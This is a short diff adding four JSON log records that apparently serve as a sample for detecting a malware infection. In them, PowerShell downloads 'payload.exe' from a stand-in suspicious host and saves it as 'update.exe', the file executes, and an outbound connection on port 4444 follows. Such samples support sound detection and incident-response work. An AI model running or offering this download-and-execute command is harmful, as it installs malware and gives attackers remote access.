@@ -1,0 +1,4 @@
+{"timestamp": "2025-05-15T08:32:41Z", "process": "cmd.exe", "user": "jdoe", "command": "powershell -Command \"Invoke-WebRequest -Uri http://suspicious.example.com/payload.exe -OutFile C:\\temp\\update.exe\""}
+{"timestamp": "2025-05-15T08:33:12Z", "process": "powershell.exe", "user": "jdoe", "command": "Invoke-WebRequest -Uri http://suspicious.example.com/payload.exe -OutFile C:\\temp\\update.exe"}
+{"timestamp": "2025-05-15T08:35:05Z", "process": "explorer.exe", "user": "jdoe", "parent": "C:\\temp\\update.exe", "action": "execute"}
+{"timestamp": "2025-05-15T08:36:10Z", "process": "svchost.exe", "user": "SYSTEM", "network": "connection", "destination": "202.12.34.56", "port": "4444"}
